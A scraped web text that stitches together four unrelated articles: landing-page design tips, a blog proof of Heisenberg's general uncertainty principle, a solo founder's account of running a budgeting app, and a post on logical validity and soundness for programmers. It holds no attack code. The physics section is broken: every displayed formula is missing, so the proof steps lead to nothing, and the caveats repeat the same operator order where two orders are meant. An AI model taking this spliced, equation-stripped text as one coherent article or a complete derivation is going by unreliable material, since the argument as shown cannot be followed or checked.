<p>Simplify the above-the-fold section of your landing page to focus on&nbsp;<strong>one main thought</strong>&nbsp;(headline), a subheadline that goes into more detail, and one&nbsp;clear&nbsp;call-to-action.</p>
<p>Here’s what an&nbsp;<em>unclear</em>&nbsp;headline looks like:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/unclear-headline.png"></figure>
<p>If you just read the headline, would you have any idea what this company does?</p>
<p>Now, on the flip side, what do you think of this headline:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/clear-headline.png"></figure>
<p>It’s pretty clear right away that this tool helps you sell stuff online.</p>
<h2>Increase the relevance</h2>
<p>Focus less on the features and more on&nbsp;<strong>benefits and outcomes</strong>&nbsp;that show the visitor how your offer will solve their problem.</p>
<p>This landing page below does a good job of focusing on the benefits for their sales tool, by mentioning stuff like “prioritize which decision makers to pursue with relevant insights:”</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/copy.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/copy.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/copy.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/copy-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/copy.png"></figure>
<h2>Create strong affinity</h2>
<p><strong>Design</strong>&nbsp;your page in a way that is easy-to-use, easy-to-navigate, looks great on mobile, has legible typography, consistent&nbsp;colors, and authentic images.</p>
<p>Creating a sense of affinity is not easy, but when you nail it, you know right away.</p>
<p>Here are two pages side-by-side:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/affinity.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/affinity.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/affinity.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/affinity-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/affinity.png"></figure>
<p>Don’t you simply like one way better than the other, even if you can’t explain exactly why?</p>
<h2>Showcase your influence</h2>
<p>Add&nbsp;<strong>social proof</strong>&nbsp;to your page with&nbsp;testimonials, case studies, numbers of customers/clients, etc.</p>
<p>One company that goes above and beyond with their social proof is Basecamp. Look at all of those testimonials:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/social-proof.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/social-proof.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/social-proof.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/social-proof-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/social-proof.png"></figure>
<h2>Build up trust</h2>
<p>Increase the perception of&nbsp;<strong>trust</strong>&nbsp;by adding trust indicators, badges, certifications, affiliations, and other quantifiable stats such as the number of years in business.</p>
<p>InVision does a great job of showcasing some well-known trust signals below the hero section:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/trust-signals.png"></figure>
<h2>Mention an advantage</h2>
<p>Make sure to mention your&nbsp;<strong>unique advantage</strong>&nbsp;that highlights something special about your offer/product/service to address how your solution is different from other options.</p>
<p>My&nbsp;<em>favorite</em>&nbsp;example of a unique advantage is Dyson and their “cyclone technology:”</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/unique-advantage.png"></figure>
<h2>Make it easy to take action</h2>
<p>Repeat your&nbsp;<strong>call-to-action</strong>&nbsp;several times throughout the page using a contrasting color/style to make it stand out, especially mentioning it at the top and bottom sections.</p>
<p>Here’s an above-the-fold portion of a site that has literally&nbsp;<em>no</em>&nbsp;visible&nbsp;call-to-action&nbsp;in their hero section:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/bad-cta.png"></figure>
<p>On the other hand, this financial services company makes it super easy to understand exactly what they want you to do next:</p>
<figure><img src="https://growthmarketer.co/wp-content/uploads/2020/07/good-cta.png" alt="" srcset="https://growthmarketer.co/wp-content/uploads/2020/07/good-cta.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-srcset="https://growthmarketer.co/wp-content/uploads/2020/07/good-cta.png 1920w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-300x169.png 300w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-1024x576.png 1024w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-768x432.png 768w, https://growthmarketer.co/wp-content/uploads/2020/07/good-cta-1536x864.png 1536w" data-lazy-src="https://growthmarketer.co/wp-content/uploads/2020/07/good-cta.png"></figure>

      <h3 id="introduction">Introduction</h3>

<p>In quantum mechanics, one of the key discoveries is that it is not always possible that we could measure two physical observables precisely, which is the Heisenberg’s general uncertainty principle.</p>



<p>We might have learned a special case of the Heisenberg’s general uncertainty principle from high school or college physics courses that the more precisely the position of some particle is determined, the less precisely its momentum can be predicted from initial conditions, and vice versa. In this case, the two physical observables are position and momentum.</p>



<p>Formally, the Heisenberg’s general uncertainty principle states that the product of the variances of two arbitrary hermitian operators on a given state is always greater than or equal to one-fourth the square of the expected value of their commutator. In formulas:</p>



<p>where $\mathbb{V}_{\psi}(\Omega_1)$ and $\mathbb{V}_{\psi}(\Omega_2)$ are using the notations from my previous <a href="https://leimao.github.io/blog/Quantum-Mean-Variance/">post</a>, $[\Omega_1, \Omega_2]$ is called the commutator of $\Omega_1$ and $\Omega_2$, and $[\Omega_1, \Omega_2] = \Omega_1 \Omega_2 - \Omega_2 \Omega_1$.</p>



<p>In this blog post, I would like to show a mathematical proof to Heisenberg’s general uncertainty principle.</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>We would use the following four theorems and properties to prove Heisenberg’s general uncertainty principle.</p>

<h4 id="cauchyschwarz-inequality">Cauchy–Schwarz Inequality</h4>

<p>The Cauchy–Schwarz inequality states that for all vectors $u$ and $v$ of an inner product space it is true that</p>



<p>The proof could be found on <a href="https://en.wikipedia.org/wiki/Cauchy%E2%80%93Schwarz_inequality">Wikipedia</a>.</p>

<h4 id="imaginary-part-of-vector-inner-product">Imaginary Part of Vector Inner Product</h4>

<p>The imaginary part of the inner product of all vectors $u$ and $v$, $\text{Im}\big(\langle u, v \rangle\big)$, could be computed as</p>



<p>Assuming $u = a_1 + b_1 i$ and $v = a_2 + b_2 i$, where $a_1$, $a_2$, $b_1$, and $b_2$ are real (column) vectors.</p>





<p>It is trivial to see that</p>



<p>This concludes the proof.</p>

<h4 id="triangle-inequality">Triangle Inequality</h4>

<p>Let $z$ be any complex number, we have</p>



<p>This should be very straightforward to the people who are familiar with triangles and know the polar coordinate expression of complex numbers. We will skip the formal proof here.</p>

<h4 id="hermitian-property">Hermitian Property</h4>

<p>If A is a hermitian $n$-by-$n$ matrix, then for all $u, v^{\prime} \in \mathbb{C}$. we have</p>



<p>Using the property of hermitian matrix $A^{\dagger} = A$, we simply have</p>



<p>This concludes the proof.</p>

<h3 id="proof-to-heisenbergs-general-uncertainty-principle">Proof to Heisenberg’s General Uncertainty Principle</h3>

<p>Because $\Delta_{\psi}(\Omega) = \Omega - \langle \Omega \rangle_{\psi} I$ and $\Omega$ is a hermitian operator, therefore $\Delta_{\psi}(\Omega)$ is also a hermitian operator. Based on <a href="https://leimao.github.io/blog/Quantum-Mean-Variance/">the definition of variance</a>, using the hermitian property, we further have</p>



<p>We apply the Cauchy–Schwarz inequality to the left side of the Heisenberg’s general uncertainty principle,</p>



<p>We further apply the Triangle inequality,</p>



<p>We use the imaginary part of vector inner product,</p>



<p>We use the hermitian property again,</p>



<p>This concludes the proof.</p>

<h3 id="caveats">Caveats</h3>

<p>In Heisenberg’s general uncertainty principle, the commutator $[\Omega_1, \Omega_2] = 0$ suggests $\Omega_1 \Omega_2 = \Omega_2 \Omega_1$ and $\Omega_1 \Omega_2 | \psi \rangle = \Omega_2 \Omega_1 | \psi \rangle$. This means that the system states after the two sequential measures $\Omega_1 \Omega_2$ and $\Omega_1 \Omega_2$ are the same if $[\Omega_1, \Omega_2] = 0$. Otherwise, if $[\Omega_1, \Omega_2] \neq 0$ the system states after the two sequential measures $\Omega_1 \Omega_2$ and $\Omega_1 \Omega_2$ are not the same. If the commutator $[\Omega_1, \Omega_2] = 0$, Heisenberg’s general uncertainty principle suggests that the two physical observables that $\Omega_1$ and $\Omega_2$ are measuring would have not limit in precision.</p>



<p>In other expressions of Heisenberg’s general uncertainty principle, sometimes we would see the word “simultaneity”. How to understand the simultaneity in Heisenberg’s general uncertainty principle? Given measurement would change the system state, and it is almost impossible to achieve the absolute simultaneity in the time domain, what does the simultaneity mean in this case? Here simultaneity means that the order of measurement $\Omega_1$ and $\Omega_2$ do not change the final observation, as we tried hard to make them simultaneous and it is impossible to control the exact order of these two measurements. In short, simultaneity just means $[\Omega_1, \Omega_2] = 0$.</p>



<p>How to measure the variance of physical observable for a system state, as is shown at the left side of the inequality of Heisenberg’s general uncertainty principle? Measurement changes system state in quantum mechanics. We would need to create lots of clones of the system state. Once a system state is measured, it should be discarded and not be used for the measurement for the physical observable anymore. Measurement on the same system state means measurement on system state clones and not the exact system state.</p>

<h3 id="conclusions">Conclusions</h3>

<p>It is quite amazing that the Heisenberg’s general uncertainty principle could be derived in a such simple way. Unfortunately, the my college physics course instructor never showed a proof to this important principle.</p>

<p>Hello! 👋 My name is Jen and I’m the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I’ve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I’m excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here’s what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I’d push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I’ve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I’ve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that’s working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I’m code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I’m half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money– no more pushing major features straight to production 🤯😂 <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>— Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that’s as bug-free as possible.</p>

<p>As an engineering team of one, it’s nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It’s nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it’s also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn’t always make sense to automate right off the bat.</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png"><span>Obligatory XKCD comic (<a href="https://xkcd.com/1205/" target="_blank">link</a>)</span></p>

<p>Automating too late is not a bad thing. I’ll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone– it’s always better to grok the requirements first to some degree so you can understand how to best utilize who you’ve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn’t confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I’m glad I didn’t spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (🍏) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn’t end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May’s invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn’t put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I’ll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I’ve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

<p>After a marketing push, let’s say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I’ll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I’m committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert 🤞.</p>



<p>I used to think that if I were to hire someone, it would first be a customer support agent but I’ve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I’m also able to identify and overhaul the common sources of trouble for users.</p>

<p>I’ve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<p><img src="https://lunchbag.ca/uploads/screen-shot-2020-05-21-at-4-20-15-pm.png"><span>Handling support on my own should be sustainable at least for the foreseeable future!</span></p>

			<h2>What it means to be wrong and why it’s bad</h2>
<h3>Logical incorrectness</h3>
<p>It’s generally better to be right than to be wrong. Since there’s more than one way to be wrong, I want to be specific about the type of wrongness I want to address in this post before I move on.</p>
<p>The type of wrongness I’m interested in in this post is logical incorrectness, like two plus two equals five.</p>
<h3>The danger of being wrong</h3>
<p>Being right or wrong isn’t just an academic concern. In programming, being wrong often has concrete negative economic (and other) impacts. Developers who are often wrong will be much less efficient and burn up much more payroll cost and opportunity cost than developers who are wrong less often.</p>
<p>Being wrong is also not something that happens every great once in a while. Most humans are wrong about a whole bunch of stuff, a lot of the time, because that’s just human nature. Even really smart people are wrong about things a very nonzero amount of the time.</p>
<p>So I want to share some things we developers can do in order to be wrong less. But first let me share a concrete example of the kind of mistakenness I’m talking about.</p>
<h2>An example of being wrong</h2>
<h3>Bug: an appointment goes missing</h3>
<p>Let’s say I’m building some scheduling software. One of my users, Rachel, reports to me that yesterday she rescheduled someone’s appointment from July 1st at 10am to July 3rd at 10am. Today, Rachel looked at both the schedule for July 1st and July 3rd and the appointment isn’t present on either day. Apparently there’s a bug that removes appointments from the schedule when you try to reschedule them.</p>
<p>So I start to look at the code and see if I can find any evidence that this buggy behavior is present. Unfortunately, the code is very complicated, and my investigation takes a long time. My investigation lasts an entire day. By the end of the day I’ve made almost no progress toward fixing the bug.</p>
<h3>The bug was not the bug</h3>
<p>Unbeknownst to me, the thing I thought was the bug was not actually the bug. In fact, there was no bug. Between the time Rachel rescheduled the appointment and the time Rachel found the appointment missing, another user, Janice. deleted the appointment. There was in fact no bug at all. I was wrong. I wasted a whole day as a consequence of being wrong.</p>
<h2>How to be less wrong</h2>
<p>We developers can be wrong less of the time by studying <b>epistemology</b>. Epistemology is a branch of philosophy which deals with the acquisition of knowledge. Epistemology tells us how we can know, with certainty, what’s true and what isn’t.</p>
<p>More narrowly, we can study <b>logic</b>. Logic is a branch of philosophy that deals with a formal system of reasoning. One of the central ideas of logic is that of an <b>argument</b>. Arguments are the ideas we’ll be focusing on in this post.</p>
<h2>The definition of a logical argument</h2>
<p>An argument is a group of statements including one or more <b>premises</b> and one and only one <b>conclusion</b>. (I shamelessly stole this definition word-for-word from <a href="http://www.uky.edu/~rosdatte/phi120/lesson1a.htm">this web page</a>.)</p>
<p>Now let’s talk about what a premise is and what a conclusion is. As an aid I’ll share an example of a logical argument, henceforth just referred to as an “argument”.</p>
<h3>Argument example</h3>
<blockquote><p>
All fish live in water.<br>
All sharks are fish.<br>
Therefore, all sharks live in water.
</p></blockquote>
<p>This argument contains two premises. “All fish live in water” is a premise. “All sharks are fish” is also a premise.</p>
<p>This argument’s conclusion is of course “Therefore, all sharks live in water”. If it’s true that all fish live in water and it’s true that all sharks are fish, then it’s of course true that all sharks live in water.</p>
<h2>Validity and soundness</h2>
<p>Not all arguments are good ones. An argument can be <b>valid</b> or <b>invalid</b> and <b>sound</b> or <b>unsound</b>.</p>
<h3>Validity</h3>
<p>An argument is <b>valid</b> if the truth of the argument’s conclusion is logically connected to the argument’s premises. Our above fish/shark argument is a valid argument because, if the argument’s premises are true, its conclusion must necessarily be true. We could make the argument invalid by changing some things.</p>
<blockquote><p>
All fish live in water.<br>
All sharks are fish.<br>
Therefore, all sharks have fins.
</p></blockquote>
<p>This argument isn’t valid because its conclusion doesn’t logically flow from its premises. It happens to be true that all sharks have fins, but that fact isn’t true as a natural consequence of this argument’s premises, so the argument isn’t valid.</p>
<p>Note that validity doesn’t have anything to do with truth. An argument can be valid even if its premises aren’t true.</p>
<blockquote><p>
All turtles are invisible.<br>
Everyone has a turtle in their brain.<br>
Therefore, everyone has an invisible turtle in their brain.
</p></blockquote>
<p>The premises of the above argument aren’t true (at least as far as I know) but the argument is nonetheless valid.</p>
<h3>Soundness</h3>
<p>An argument is <b>sound</b> if the argument is valid and its premises are true. Our first argument (“all fish live in water, all sharks are fish, therefore all sharks live in water”) is sound because the argument is valid and its premises are true. <b>Sound arguments always have true conclusions.</b></p>
<p>Here’s another sound argument.</p>
<blockquote><p>
Every 20th century American president has been male.<br>
Richard Nixon was a 20th century American president.<br>
Richard Nixon was male.
</p></blockquote>
